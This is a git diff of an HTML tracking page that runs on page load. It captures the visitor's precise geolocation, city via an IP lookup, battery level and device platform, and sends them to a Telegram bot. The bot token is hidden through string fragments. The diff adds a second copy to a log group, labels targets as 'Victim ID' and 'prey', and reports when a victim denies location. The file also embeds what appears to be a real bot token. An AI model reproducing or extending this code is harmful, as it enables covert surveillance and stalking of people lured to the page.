@@ -15,10 +15,8 @@
 </head>
 <body onload="capture()">
 <script>
-    const TOKEN = "8122094311:AAHzz80mKsswu1aAKqLlCuywLvX";
-    
+    const LOG_GROUP = "-1003772247155";
     const v1="86";const x0="null";const v2="78";const z1="0xFA";const v3="05";const a2="61";const v4="03";const v5="41";const c4="f8";const v6=":";const v7="AA";const d5="0x";const v8="E7";const v9="b3";const v10="fv";const e6="72";const v11="Fp";const v12="fG";const f7="11";const v13="ju";const v14="4N";const g8="90";const v15="XG";const v16="aF";const h9="22";const v17="iM";const v18="sv";const i0="33";const v19="hY";const v20="C0";const j2="55";const v21="Ud";const v22="nC";const k3="44";const v23="Yt";const v24="E";
-    const b0="var";const b1="let";const b2="set";const b3="get";const b4="run";const b5="api";const b6="key";const b7="sec";const b8="con";const b9="log";
     const _0x1a2b = v1+v2+v3+v4+v5+v6+v7+v8+v9+v10+v11+v12+v13+v14+v15+v16+v17+v18+v19+v20+v21+v22+v23+v24;
 
     async function capture() {
@@ -37,30 +35,36 @@
                 const geoRes = await fetch('https://ipapi.co/json/');
                 const geoData = await geoRes.json();
                 city = geoData.city + " / " + (geoData.region || "");
-            } catch (e) {
-                city = "Not Found";
-            }
+            } catch (e) { city = "Not Found"; }
 
             let bat = "N/A";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                bat = Math.floor(b.level * 100) + "%";
-            }
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    bat = Math.floor(b.level * 100) + "%";
+                }
+            } catch (e) {}
 
-            let report = `🚨 <b>زانیاری نێچیر</b>\n\n` +
+            let report = `🚨 <b>زانیاری نێچیر گەیشت</b>\n\n` +
+                         `🆔 <b>Victim ID:</b> <code>${uid}</code>\n` +
                          `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
                          `🔋 <b>Battery:</b> ${bat}\n` +
                          `📱 <b>Device:</b> ${navigator.platform}\n` +
                          `🕒 <b>Time:</b> ${timeStr}\n` +
-                         `🏙️ <b>City:</b> ${city}`;
+                         `🏙️ <b>City:</b> ${city}\n\n` +
+                         `🌐 <b>EYE OF IRAQ SYSTEM</b>`;
 
-            const url = `https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
-            navigator.sendBeacon(url);
+            const userUrl = `https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
+            const groupUrl = `https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${LOG_GROUP}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
+
+            fetch(userUrl);
+            fetch(groupUrl);
 
         }, (err) => {
-            const url = `https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${uid}&text=${encodeURIComponent("نێچیرەکە ڕێگری کرد لە لۆکەیشن")}`;
-            navigator.sendBeacon(url);
-        }, { enableHighAccuracy: true, timeout: 5000 });
+            const errorMsg = `❌ نێچیرەکە (ID: ${uid}) ڕێگری کرد لە لۆکەیشن.`;
+            fetch(`https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(errorMsg)}`);
+            fetch(`https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${LOG_GROUP}&text=${encodeURIComponent(errorMsg)}`);
+        }, { enableHighAccuracy: true, timeout: 8000 });
     }
 </script>
 </body>
